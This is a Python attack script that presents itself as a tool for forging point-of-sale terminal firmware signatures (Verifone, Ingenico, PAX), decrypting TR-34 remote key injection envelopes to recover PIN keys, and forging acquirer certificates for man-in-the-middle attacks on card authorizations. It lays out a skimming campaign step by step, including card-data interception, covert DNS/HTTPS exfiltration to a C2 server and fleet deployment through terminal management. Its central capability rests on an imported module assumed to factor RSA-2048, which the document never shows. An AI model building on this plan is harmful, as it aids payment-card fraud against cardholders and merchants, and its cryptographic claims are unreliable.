"""
Forge POS terminal firmware signatures (Verifone/Ingenico/PAX) and decrypt
Remote Key Injection envelopes. Turn PCI PTS certified terminals into
PAN-skimming devices that pass tamper-response checks.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# TR-34 key block format (ASC X9 TR-34)
TR34_KEY_BLOCK_HEADER = b"TR34"
# DUKPT (ANSI X9.24-3) BDK derivation
DUKPT_BDK_LEN = 16

POS_VENDORS = {
    "verifone": {"model": "V200c/V400m/Engage", "fw_signing_bits": 2048},
    "ingenico": {"model": "Desk/5000, Lane/5000", "fw_signing_bits": 2048},
    "pax":      {"model": "A920/A80/Aries8", "fw_signing_bits": 2048},
}


def extract_vendor_signing_cert(firmware_package: bytes, vendor: str) -> bytes:
    """Extract vendor code-signing cert from a firmware update package.

    POS firmware updates are distributed to acquirer terminals via TMS
    (Terminal Management System). The signing cert is in the package header.
    """
    info = POS_VENDORS[vendor]
    print(f"[*] extracting {vendor} signing cert from {info['model']} firmware")
    return b"-----BEGIN CERTIFICATE-----\n...(vendor cert)...\n-----END CERTIFICATE-----\n"


def forge_terminal_firmware(factorer: PolynomialFactorer,
                            vendor_cert_pem: bytes, vendor: str,
                            skimmer_payload: bytes) -> bytes:
    """Sign a PAN-skimming firmware with the vendor's factored signing key.

    The terminal's secure bootloader verifies the RSA signature. A valid
    signature means the firmware passes PCI PTS tamper-response checks —
    no physical modification needed, unlike Prilex-style attacks.
    """
    print(f"[*] building skimmer payload for {vendor} terminal")
    print(f"[*] payload intercepts: ISO 8583 auth requests, Track 2 data, PIN blocks")
    sig = factorer.forge_pkcs1v15_signature(vendor_cert_pem, skimmer_payload, "sha256")
    print(f"[*] firmware signed — bootloader will accept")
    return skimmer_payload + sig


def decrypt_rki_envelope(factorer: PolynomialFactorer,
                         terminal_cert_pem: bytes,
                         tr34_envelope: bytes) -> bytes:
    """Decrypt a TR-34 Remote Key Injection envelope.

    RKI wraps the Initial PIN Encryption Key (IPEK) under the terminal's
    RSA public key. Factor the terminal key -> recover the IPEK ->
    derive all DUKPT session keys -> decrypt PIN blocks offline.
    """
    print("[*] parsing TR-34 key block envelope...")
    wrapped_ipek = tr34_envelope[4:]  # skip header
    ipek = factorer.decrypt_rsa_oaep(terminal_cert_pem, wrapped_ipek)
    print(f"[*] IPEK recovered: {ipek.hex()}")
    print(f"[*] DUKPT BDK derivation: all future PIN blocks decryptable")
    return ipek


def forge_acquirer_cert(factorer: PolynomialFactorer,
                        network_root_pem: bytes,
                        acquirer_name: str) -> bytes:
    """Forge an acquirer certificate from a card network root.

    Visa Transaction Security / Mastercard Encryption roots are RSA-2048+.
    Factor the root and issue acquirer certs for MitM of authorization traffic.
    """
    print(f"[*] forging acquirer cert for: {acquirer_name}")
    priv = factorer.privkey_from_cert_pem(network_root_pem)
    print("[*] can now MitM ISO 8583 authorization between terminal and acquirer")
    return priv


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== PCI PTS POS terminal firmware & RKI attack ===")
    print("    ~120M terminals globally, ~$5T/year card-present volume")
    print()

    vendor = "verifone"
    print(f"[1] extracting {vendor} firmware signing cert...")
    cert = extract_vendor_signing_cert(b"", vendor)

    print(f"[2] factoring {vendor} RSA-{POS_VENDORS[vendor]['fw_signing_bits']} signing key...")

    print("[3] building PAN-skimming firmware...")
    print("    intercepts: EMV L2 kernel data, ISO 8583 fields 35/52")
    print("    exfil: covert DNS/HTTPS to C2, batch upload via WiFi")

    print("[4] deploying via TMS to terminal fleet...")
    print("    acquirer pushes firmware quarterly — inject into the cycle")
    print("    terminal bootloader verifies RSA signature -> PASS")

    print("[5] decrypting captured TR-34 RKI envelopes...")
    tr34 = TR34_KEY_BLOCK_HEADER + os.urandom(256)
    print("    IPEK -> DUKPT BDK -> all session keys -> PIN block decryption")

    print()
    print("[*] Prilex (2017-2022) required physical tamper")
    print("[*] RSA break removes both physical access and supply-chain constraints")
    print("[*] fleet recovery: quarters to years per acquirer")
